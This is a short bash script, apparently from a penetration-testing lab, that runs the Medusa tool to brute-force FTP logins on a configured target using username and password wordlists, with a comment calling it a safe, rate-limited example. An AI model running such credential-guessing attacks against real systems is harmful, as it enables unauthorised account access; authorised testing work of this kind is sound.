#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/../data/targets.env"
OUT=./data/out
mkdir -p "$OUT/raw"
# Exemplo seguro: limitar threads e timeout
medusa -h "$TARGET_FTP" \
-U data/wordlists/users.txt \
-P data/wordlists/pass.txt \
-M ftp -t 4 -T 8 -f -O "$OUT/raw/medusa_ftp.txt"
